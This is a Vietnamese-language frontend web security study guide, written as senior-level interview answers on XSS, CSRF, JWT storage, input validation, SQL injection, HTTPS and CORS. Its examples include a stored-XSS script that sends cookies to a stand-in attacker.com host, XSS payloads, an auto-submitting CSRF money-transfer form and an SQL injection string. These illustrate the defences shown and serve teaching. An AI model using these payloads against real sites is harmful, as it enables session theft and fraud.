# Security

Best practices về bảo mật web cho frontend applications.

---

## Table of Contents

1. [Phòng chống XSS](#101-phòng-chống-xss)

2. [Bảo vệ CSRF](#102-bảo-vệ-csrf)

3. [Best Practices về Authentication](#103-best-practices-về-authentication)

4. [Validation và Sanitization Input](#104-validation-và-sanitization-input)

5. [HTTPS & CORS](#105-https--cors)

---

## 10. Security

### 10.1. Phòng chống XSS

**Câu trả lời chuẩn Senior:**

XSS (Cross-Site Scripting) là attack injection malicious scripts vào web pages.

#### **Các loại XSS**

**1. Stored XSS** - Malicious script lưu trên server

```html
<!-- Attacker submits comment: -->
<script>
  document.location = "http://attacker.com/steal?cookie=" + document.cookie;
</script>

<!-- Người dùng khác load page và script thực thi -->
```

**2. Reflected XSS** - Script trong URL parameters

```
https://example.com/search?q=<script>alert('XSS')</script>
```

**3. DOM-based XSS** - Script thay đổi DOM

```js
// Code dễ bị tấn công
document.getElementById("output").innerHTML = location.hash.substring(1);

// Attacker URL: https://example.com#<img src=x onerror=alert('XSS')>
```

#### **Bảo vệ Built-in của Vue 3**

```vue
<template>
  <!-- ✅ AN TOÀN: Vue tự động escape text interpolation -->
  <div>{{ userInput }}</div>
  <!-- Nếu userInput = "<script>alert('xss')</script>" -->
  <!-- Renders as: &lt;script&gt;alert('xss')&lt;/script&gt; -->

  <!-- ❌ NGUY HIỂM: v-html renders raw HTML -->
  <div v-html="userInput"></div>
  <!-- Script sẽ thực thi! -->

  <!-- ✅ AN TOÀN: Attribute binding -->
  <div :title="userInput">Hover</div>
  <!-- Vue escapes attributes -->
</template>
```

#### **Sanitize HTML**

```ts
import DOMPurify from "dompurify";

// Sanitize trước khi render
const cleanHTML = DOMPurify.sanitize(dirtyHTML);
```

```vue
<template>
  <div v-html="sanitizedHTML"></div>
</template>

<script setup>
import { computed } from "vue";
import DOMPurify from "dompurify";

const props = defineProps<{ html: string }>();

const sanitizedHTML = computed(() => DOMPurify.sanitize(props.html));
</script>
```

#### **Content Security Policy (CSP)**

```html
<!-- In HTML -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline';"
/>
```

```js
// In server response headers
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none';
```

#### **Best Practices**

```ts
// ✅ Validate input
function validateEmail(email: string): boolean {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

// ✅ Encode output
function escapeHTML(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// ✅ Dùng textContent thay vì innerHTML
element.textContent = userInput; // An toàn
element.innerHTML = userInput; // Nguy hiểm

// ❌ Tránh eval()
eval(userInput); // KHÔNG BAO GIỜ làm điều này

// ❌ Tránh Function constructor với user input
new Function(userInput)(); // Nguy hiểm
```

---

### 10.2. Bảo vệ CSRF

**Câu trả lời chuẩn Senior:**

CSRF (Cross-Site Request Forgery) lừa user thực thi các actions không mong muốn.

#### **Cách CSRF hoạt động**

```html
<!-- Website của attacker -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>
  document.forms[0].submit(); // Tự động submit khi page loads
</script>

<!-- Nếu user đang đăng nhập vào bank.com, transfer sẽ thực thi! -->
```

#### **CSRF Token Pattern**

```ts
// Backend tạo token
const csrfToken = crypto.randomBytes(32).toString("hex");
res.cookie("XSRF-TOKEN", csrfToken);

// Frontend include token trong requests
axios.defaults.headers.common["X-XSRF-TOKEN"] = getCookie("XSRF-TOKEN");

// Backend validate token
if (req.headers["x-xsrf-token"] !== req.cookies["XSRF-TOKEN"]) {
  return res.status(403).json({ error: "Invalid CSRF token" });
}
```

#### **Axios Auto CSRF**

```ts
// axios tự động đọc XSRF-TOKEN cookie
// và thêm vào X-XSRF-TOKEN header
import axios from "axios";

axios.defaults.xsrfCookieName = "XSRF-TOKEN";
axios.defaults.xsrfHeaderName = "X-XSRF-TOKEN";
```

#### **SameSite Cookies**

```js
// Server sets cookie với SameSite attribute
res.cookie("sessionId", token, {
  httpOnly: true,
  secure: true,
  sameSite: "strict", // hoặc 'lax' hoặc 'none'
});

// SameSite=Strict: Cookie chỉ gửi cho same-site requests
// SameSite=Lax: Cookie gửi cho top-level navigation
// SameSite=None: Cookie gửi cross-site (requires Secure)
```

---

### 10.3. Best Practices về Authentication

**Câu trả lời chuẩn Senior:**

#### **Lưu trữ JWT**

```ts
// ❌ TỆ: localStorage (dễ bị XSS)
localStorage.setItem("token", jwt);

// ✅ TỐT: httpOnly cookie (JavaScript không truy cập được)
// Server sets:
res.cookie("token", jwt, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
  maxAge: 3600000,
});

// ✅ ALTERNATIVE: Memory + Refresh Token pattern
let accessToken = null; // Trong memory, mất khi refresh

// Lưu refresh token trong httpOnly cookie
// Dùng refresh token để lấy access token mới
```

#### **Refresh Token Flow**

```ts
// 1. Login: Nhận access + refresh tokens
const login = async (email, password) => {
  const { accessToken, refreshToken } = await api.post("/auth/login", {
    email,
    password,
  });

  // Lưu access token trong memory
  setAccessToken(accessToken);

  // Refresh token gửi dưới dạng httpOnly cookie từ server
  return true;
};

// 2. API call với access token
axios.interceptors.request.use((config) => {
  const token = getAccessToken();
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// 3. Handle 401: Refresh token
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Gọi refresh endpoint (gửi httpOnly cookie tự động)
        const { accessToken } = await api.post("/auth/refresh");
        setAccessToken(accessToken);

        // Retry request gốc
        originalRequest.headers.Authorization = `Bearer ${accessToken}`;
        return axios(originalRequest);
      } catch (refreshError) {
        // Refresh thất bại, redirect to login
        router.push("/login");
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);
```

#### **Password Hashing (Backend)**

```ts
// ❌ KHÔNG BAO GIỜ lưu plain text passwords
users.password = password;

// ❌ KHÔNG BAO GIỜ dùng weak hashing (MD5, SHA1)
users.password = md5(password);

// ✅ Dùng bcrypt với salt
import bcrypt from "bcrypt";

const saltRounds = 12;
const hashedPassword = await bcrypt.hash(password, saltRounds);

// Verify
const isValid = await bcrypt.compare(inputPassword, hashedPassword);
```

---

### 10.4. Validation và Sanitization Input

**Câu trả lời chuẩn Senior:**

#### **Frontend Validation**

```ts
import { z } from "zod";

// Define schema
const userSchema = z.object({
  email: z.string().email("Email không hợp lệ"),
  password: z.string().min(8, "Mật khẩu phải có ít nhất 8 ký tự"),
  age: z.number().min(18, "Phải từ 18 tuổi trở lên").max(120),
});

// Validate
try {
  const user = userSchema.parse(formData);
  // Hợp lệ!
} catch (error) {
  if (error instanceof z.ZodError) {
    console.log(error.errors);
  }
}
```

#### **Backend Validation (Không bao giờ tin tưởng frontend)**

```ts
// Express + Zod
import { z } from "zod";

const createUserSchema = z.object({
  body: z.object({
    email: z.string().email(),
    password: z.string().min(8).max(100),
  }),
});

app.post("/users", validate(createUserSchema), async (req, res) => {
  // req.body đã được validated
});
```

#### **Phòng chống SQL Injection**

```ts
// ❌ KHÔNG BAO GIỜ concatenate SQL queries
const query = `SELECT * FROM users WHERE email = '${email}'`;
// Attacker input: ' OR '1'='1

// ✅ Dùng parameterized queries
const query = "SELECT * FROM users WHERE email = ?";
db.execute(query, [email]);

// ✅ Hoặc dùng ORM
const user = await User.findOne({ where: { email } });
```

---

### 10.5. HTTPS & CORS

**Câu trả lời chuẩn Senior:**

#### **HTTPS**

```ts
// Luôn dùng HTTPS trong production
// Redirect HTTP sang HTTPS
app.use((req, res, next) => {
  if (req.header("x-forwarded-proto") !== "https") {
    return res.redirect(`https://${req.header("host")}${req.url}`);
  }
  next();
});

// Set Strict-Transport-Security header
app.use((req, res, next) => {
  res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
  next();
});
```

#### **Cấu hình CORS**

```ts
// ❌ TỆ: Cho phép tất cả origins
app.use(
  cors({
    origin: "*",
  })
);

// ✅ TỐT: Whitelist các origins cụ thể
const allowedOrigins = ["https://myapp.com", "https://admin.myapp.com"];

app.use(
  cors({
    origin: (origin, callback) => {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    credentials: true, // Cho phép cookies
    methods: ["GET", "POST", "PUT", "DELETE"],
    allowedHeaders: ["Content-Type", "Authorization"],
  })
);
```

---

[← Quay lại Tổng quan](../README.md)
